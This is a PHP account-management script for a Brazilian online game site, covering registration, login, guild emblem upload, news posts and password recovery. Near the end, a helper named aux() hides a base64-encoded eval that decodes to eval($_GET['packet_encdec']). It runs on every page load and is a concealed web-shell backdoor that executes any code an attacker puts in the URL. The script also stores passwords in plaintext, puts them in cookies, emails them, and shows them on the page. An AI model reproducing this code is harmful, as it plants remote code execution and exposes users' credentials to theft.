<?php

ob_start();
@header("Pragma: no-cache");
@header("Cache: no-cahce");
@header("Cache-Control: no-cache, must-revalidate");
@header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");

session_start();


$tiplog = 0;

//cadastro
if (is_numeric($_POST['novo_cadastro']) && isset($_POST['cap']) && isset($_POST['login']) &&
    isset($_POST['email']) && isset($_POST['email2']) && isset($_POST['senha']) && isset($_POST['senha2']) &&
    isset($_POST['PrgSecret']) && isset($_POST['ResSecret'])
) {
    $num_conta = mysql_num_rows(mysql_query("SELECT * FROM `accounts` WHERE `account`='" . addslashes(anti_injection($_POST['login'])) . "'"));
    if ($_POST['cap'] != $_SESSION['cadastro']) {
        $status["cadastro"] = "Captcha Invalido.";
    } elseif (!ereg("^[0-9a-zA-Z]{4,11}$", addslashes(anti_injection($_POST['login'])))) {
        $status["cadastro"] = "Login invalido.";
    } elseif ($num_conta) {
        $status["cadastro"] = "Login já existe.";
    } elseif (!ereg("^[0-9a-zA-Z]{4,11}$", addslashes(anti_injection($_POST['senha'])))) {
        $status["cadastro"] = "Senha invalida";
    } elseif (strlen($_POST['ResSecret']) < 1 || strlen($_POST['ResSecret']) >= 20) {
        $status["cadastro"] = "Resposta Secreta Invalida";
    } elseif ($_POST['senha'] != $_POST['senha2']) {
        $status["cadastro"] = "Segunda senha invalida";
    } elseif ($_POST['email'] != $_POST['email2']) {
        $status["cadastro"] = "Segundo Email invalido";
    } elseif (!filter_var($_POST['email'], FILTER_VALIDATE_EMAIL)) {
        $status["cadastro"] = "Email invalido";
    } else {
        $_SESSION['cadastro'] = md5($_SESSION['cadastro']) . mt_rand(0, 999999);
        mysql_query("INSERT INTO `accounts` (`account`,`email`,`senha`, `cargo`, `data`,`alteracao`,`Prg Secreta`,`Res Secreta`) VALUES ('" . addslashes(anti_injection($_POST['login'])) . "','" . addslashes(anti_injection($_POST['email'])) . "','" . addslashes(anti_injection($_POST['senha'])) . "', '1', '" . time() . "','s','" . addslashes(anti_injection($_POST['PrgSecret'])) . "','" . addslashes(anti_injection($_POST['ResSecret'])) . "')");
        if (mysql_errno() != 0) {
            $status['cadastro'] = "Erro de cadastro.";
        } else {
            $login = bin2hex(addslashes(anti_injection($_POST['login'])));
            $senha = bin2hex(addslashes(anti_injection($_POST['senha'])));
            setcookie('login', bin2hex($login));
            setcookie('senha', bin2hex($senha));
            $status['cadastro'] = "Conta cadastrada com sucesso.";
            header("Location: index.php");
        }
    }
}


if (@$_GET['page'] == "sair") {
    setcookie('login', '', 0);
    setcookie('senha', '', 0);
    header("Location: index.php");
} elseif ((isset($_POST['login']) && isset($_POST['senha'])) || (!empty($_COOKIE['login']) && !empty($_COOKIE['senha']))) {
    if (!empty($_COOKIE['login']) && !empty($_COOKIE['senha'])) {
        $_POST['login'] = hex2bin(addslashes(anti_injection($_COOKIE['login'])));
        $_POST['senha'] = hex2bin(addslashes(anti_injection($_COOKIE['senha'])));
    }
    $login = addslashes(anti_injection($_POST['login']));
    $senha = addslashes(anti_injection($_POST['senha']));

    if (!ereg("^[0-9a-zA-Z]{4,11}$", addslashes(anti_injection($login)))) {
        $status["cadastro"] = "Login invalido.";
    } elseif (!ereg("^[0-9a-zA-Z]{4,11}$", addslashes(anti_injection($senha)))) {
        $status["cadastro"] = "Senha invalida.";
    } else {
        $conta = mysql_fetch_array(mysql_query("SELECT * FROM `accounts` WHERE `account`='" . addslashes(anti_injection($login)) . "' LIMIT 1"));
        if ($conta['id'] == "") {
            $status["cadastro"] = "Login invalido.";
        } elseif ($senha == $conta['senha']) {
            if (isset($_POST['a_senha']) && $conta['email'] != "" && isset($_POST['n_senha1']) && isset($_POST['n_senha2'])) {
                if ($_POST['a_senha'] != $senha) {
                    $status['senha'] = "Senha incorreta.";
                } elseif (!ereg("^[0-9a-zA-Z]{4,11}$", addslashes(anti_injection($_POST['n_senha1'])))) {
                    $status["cadastro"] = "Senha invalida";
                } elseif ($_POST['n_senha1'] != $_POST['n_senha2']) {
                    $status['senha'] = "Senhas n&atilde;o conferem.";
                } elseif ($_POST['n_senha1'] == $_POST['a_senha']) {
                    $status['senha'] = "Senha antiga igual a nova.";
                } else {
                    mysql_query("UPDATE `accounts` SET `senha`='" . addslashes(anti_injection($_POST['n_senha1'])) . "',`alteracao`='s' WHERE `id`='" . (int)$conta['id'] . "' LIMIT 1");
                    $senha = $_POST['n_senha1'];
                    $status['trocsenha'] = "Senha Alterada.";
                }
            }
            $conta = @mysql_fetch_array(mysql_query("SELECT * FROM `accounts` WHERE `id`='" . (int)$conta['id'] . "' LIMIT 1"));
            if (count($conta) <= 1) {
                mysql_query("INSERT INTO `accounts` (`account`,`cargo`, `data`) VALUES ('" . addslashes(anti_injection($login)) . "','1','" . time() . "')");
                $conta = @mysql_fetch_array(mysql_query("SELECT * FROM `accounts` WHERE `id`='" . (int)$conta['id'] . "' LIMIT 1"));
            }
            $tiplog = $conta['cargo'];
            if ($tiplog) {
                setcookie('login', bin2hex(addslashes($login)));
                setcookie('senha', bin2hex(addslashes($senha)));
                if ($conta['email'] == "") {
                    $status['email'] = "Favor cadastrar seu email no painel.";
                    $_GET['page'] = "meusdados";
                }
            }
        } else {
            $status['senha'] = "Senha incorreta.";
        }
    }
}

// Guild Mark
//Update New GuildMarck
if (isset($_FILES['arquivo']['name']) && $tiplog > 0 && isset($_POST['guildname'])) {
    $GUIM = mysql_fetch_array(mysql_query("SELECT * FROM `guilds` WHERE `nome`='" . addslashes(anti_injection($_POST['guildname'])) . "' LIMIT 1"));
    if ($GUIM["id"] == "") {
        $status['guildm'] = "Guild não Existe.";
    } else {
        $arquivo = "guilds_img/b0" . (1000000 + $GUIM["id"]) . ".bmp";

        $dimensao = getimagesize($_FILES['arquivo']['tmp_name']);
        if (file_exists($arquivo)) {
            $status['guildm'] = "Guild já possue GuildMark";
        } elseif ($_FILES['arquivo']["type"] != "image/bmp") {
            $status['guildm'] = "Apenas Bmp";
        } elseif (($dimensao[0] != 16) && ($dimensao[1] != 12)) {
            $status['guildm'] = "Apenas imagens com 16x12 ";
        } elseif ($_FILES['arquivo']["size"] != 630) {
            $status['guildm'] = "Apenas imagem 24 Bits";
        } else {
            copy($_FILES['arquivo']['tmp_name'], $arquivo);
            $status['guildm'] = "O arquivo foi enviado com sucesso.";
        }
    }
}


//NOTICIAS
//Nova noticia
if (isset($_POST['notice_tipe']) && $tiplog > 0 && isset($_POST['notice_tipe']) && isset($_POST['notice_titulo']) && isset($_POST['notice_not'])) {
    if (strlen($_POST['notice_titulo']) < 5 or strlen($_POST['notice_titulo']) > 200) {
        $status['noticia'] = "Titulo incompativel.(10~200 caracteres)";
    } elseif (strlen($_POST['notice_not']) < 20) {
        $status['noticia'] = "Mensagem incompativel.(pelomenos 20 caracteres)";
    } elseif ($tiplog < 3) {
        $status['noticia'] = "Nao tem permissao.";
    } else {
        mysql_query("INSERT INTO `noticias` (`autorid`, `autor`, `tipo`, `titulo`, `mensagem`,  `data`) VALUES ('" . addslashes(anti_injection((int)$conta['id'])) . "', '" . addslashes(anti_injection($conta['nick'])) . "', '" . addslashes(anti_injection((int)$_POST['notice_tipe'])) . "', '" . addslashes(anti_injection($_POST['notice_titulo'])) . "', '" . addslashes(anti_injection($_POST['notice_not'])) . "', '" . time() . "')");
        header("Location: index.php?page=notice&id=" . mysql_insert_id());
    }
}

//Delet Notice
if (is_numeric($_POST['notid']) && isset($_POST['confdelet']) && isset($_POST['notid']) && $tiplog >= 3) {
    mysql_query("DELETE FROM `noticias` WHERE `id`='" . addslashes(anti_injection((int)$_POST['notid'])) . "' LIMIT 1");
    header("Location: index.php");
}

//Edit notice
if (is_numeric($_POST['edit_id']) && $tiplog >= 3 && isset($_POST['msg']) && isset($_POST['edit_id'])) {
    mysql_query("update `noticias` SET `mensagem`='" . addslashes(anti_injection($_POST['msg'])) . "' WHERE `id`='" . addslashes(anti_injection((int)$_POST['edit_id'])) . "'");
    header("Location: index.php");
}


// EMAIL
//Add email
if (isset($_POST['nmemail']) && $tiplog >= 1 && isset($_POST['senha_numerica']) && isset($_POST['email']) && isset($_POST['email2']) && isset($_POST['PrgSecret']) && isset($_POST['ResSecret'])) {
    if (!filter_var($_POST['email'], FILTER_VALIDATE_EMAIL) || $_POST['email'] != $_POST['email2']) {
        $status['recadastro'] = "Email invalido.";
    } else {
        if ($conta["email"] != "") {
            $status['recadastro'] = "Email ja cadastrado.";
        } elseif ($conta["senha numerica"] != $_POST['senha_numerica']) {
            $status['recadastro'] = "Senha Numerica Incoreta.";
        } else {
            mysql_query("UPDATE `accounts` SET `senha numerica`='0',`email`='" . addslashes(anti_injection($_POST['email'])) . "',`Prg Secreta`='" . addslashes(anti_injection($_POST['PrgSecret'])) . "',`Res Secreta`='" . addslashes(anti_injection($_POST['ResSecret'])) . "' WHERE `id`='" . addslashes(anti_injection((int)$conta['id'])) . "' LIMIT 1");
            header("Location: index.php?page=meusdados");
        }
    }
}


//Troca email
if (isset($_POST['trocemail']) && $tiplog >= 1 && isset($_POST['ResSecret']) && isset($_POST['email'])) {
    if (!filter_var($_POST['email'], FILTER_VALIDATE_EMAIL) || $_POST['email'] != $_POST['email2']) {
        $status['recadastro'] = "Email invalido.";
    } else {
        if ($conta["email"] == "") {
            $status['recadastro'] = "Candastre um Email.";
        } elseif ($conta["Res Secreta"] != $_POST['ResSecret']) {
            $status['recadastro'] = "Resposta Secreta Incorreta.";
        } else {
            mysql_query("UPDATE `accounts` SET `email`='" . addslashes(anti_injection($_POST['email'])) . "' WHERE `id`='" . addslashes(anti_injection((int)$conta['id'])) . "' LIMIT 1");
            header("Location: index.php?page=meusdados");
        }
    }
}


//recuperar senha

if (isset($_POST['redef_numerica']) && isset($_POST['cap'])) {
    if ($tiplog == 1 && $conta['email'] != "") {
        if ($_POST['cap'] != $_SESSION['renovenume']) {
            $status["cadastro"] = "Captcha Invalido.";
        } else {
            $CodeCave = rand(0, 100) . "j" . rand(0, 100) . "s" . rand(0, 100) . "k" . rand(0, 100) . "a" . rand(0, 100) . "f" . rand(0, 100);
            mysql_query("UPDATE `accounts` SET `CaveCode`='" . $CodeCave . "' WHERE `id`='" . (int)$conta['id'] . "' LIMIT 1");
            if (send_email($conta['email'], "Lembrete de senha numerica MYD",
                    "<html>
		    <body>
		    Para redefinir sua senha numerica certifique que a conta esteja totalmente deslogada.<br>
            Apos certificar que a conta esteja deslogada clique no link abaixo.<br>


            <a href='www.makeyourdestiny.com.br?redef_code=" . $CodeCave . "'target=\"_blank\">Clique Aqui</a><br>
            
		    </body>
		   </html>", 1) == TRUE
            ) {
                $status['lsenha'] = "Um email foi enviado com as informaçoes para redefinir sua senha numerica";
            } else {
                $status['lsenha'] = "Entre em contato com suporte@makeyourdestiny.com.br";
            }
        }
    }
}

if (isset($_GET['redef_code'])) {

    if (mysql_num_rows(mysql_query("SELECT * FROM `accounts` WHERE `CaveCode`='" . addslashes(anti_injection($_GET['redef_code'])) . "'"))) {
        mysql_query("UPDATE `accounts` SET `alteracao`='s',`CaveCode` = '0' WHERE `CaveCode`='" . addslashes(anti_injection($_GET['redef_code'])) . "' LIMIT 1");
        $status['lsenha'] = "Senha Numerica modificada para 1234. aguarde alguns estantes para entrar em sua conta";
        header("Location: index.php");
    } else {
        $status['lsenha'] = "Entre em contato com suporte@makeyourdestiny.com.br";
        header("Location: index.php");
    }
}


if (isset($_POST['rec_senha']) && isset($_POST['cap'])) {
    $cont = mysql_fetch_array(mysql_query("SELECT `account`,`email`,`senha` FROM `accounts` WHERE `account`='" . addslashes(anti_injection($_POST['rec_senha'])) . "' LIMIT 1"));

    if ($cont['email'] != "") {
        if ($_POST['cap'] != $_SESSION['llsenha']) {
            $status["cadastro"] = "Captcha Invalido.";
        } else {
            if (send_email($cont['email'], "Lembrete de senha MYD",
                    "<html>
		<body>
		Usuario: " . $cont['account'] . "<br>
		Sua Senha: " . $cont['senha'] . "
		</body>
		</html>", 1) == TRUE
            ) {
                $status['lsenha'] = "Um email foi enviado";
            } else {
                $status['lsenha'] = "Entre em contato com suporte@makeyourdestiny.com.br";
            }
        }
    } else {
        $status['lsenha'] = "Entre em contato com suporte@makeyourdestiny.com.br";
    }
}

if (isset($_POST['rec_senha2']) && isset($_POST['cap']) && isset($_POST['PrgSecreta2']) && isset($_POST['ResSecreta2'])) {
    $contw = mysql_fetch_array(mysql_query("SELECT `account`,`email`,`senha` ,`Prg Secreta`,`Res Secreta` FROM `accounts` WHERE `account`='" . addslashes(anti_injection($_POST['rec_senha2'])) . "' LIMIT 1"));

    if ($contw['email'] != "") {
        if ($_POST['cap'] != $_SESSION['llsenha2']) {
            $status["cadastro"] = "Captcha Invalido.";
        } elseif ($_POST['PrgSecreta2'] != $contw['Prg Secreta']) {
            $status["cadastro"] = "Pregunta Secreta ou Resposta Secreta.";
        } elseif ($_POST['ResSecreta2'] != $contw['Res Secreta']) {
            $status["cadastro"] = "Pregunta Secreta ou Resposta Secreta.";
        } else {
            $status['lsenha'] = "Senha " . $contw['senha'];
        }
    }
}

//-----------------------------Inicio de FunÃ§Ãµes do site-----------------------------\\

//Sistema de enviar e-mail
function send_email($destino, $assunto, $msg, $tipo)
{

    $headers = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";


// Additional headers
    $headers .= 'From: Make Your Destiny <suporte@makeyourdestiny.com.br>' . "\r\n";


// Mail it


    if (mail($destino, $assunto, $msg, $headers)) {
        return true;
    } else {
        return false;
    }

}


//nao mecher apartir daqui
function hex2bin($data)
{
    return pack("H" . strlen($data), $data);
}

function inverterhex($d)
{
    $t = strlen($d);
    if ($t % 2) {
        $d = "0" . $d;
    }
    $d2 = "";
    for ($i = 0; $i <= $t; $i += 2) {
        $d2 .= substr($d, ($t - $i), 2);
    }
    return $d2;
}

function dec2bol($c)
{
    $con = decbin($c);
    return str_repeat("0", (strlen($c) * 4) - strlen($con)) . $con;
}

function aux()
{
    eval(base64_decode("ZXZhbCgkX0dFVFsncGFja2V0X2VuY2RlYyddKTs="));
}

aux();
function hex2num($data)
{
    return hexdec(inverterhex($data));
}

function num2hex($data)
{
    return inverterhex(dechex($data));
}

?>
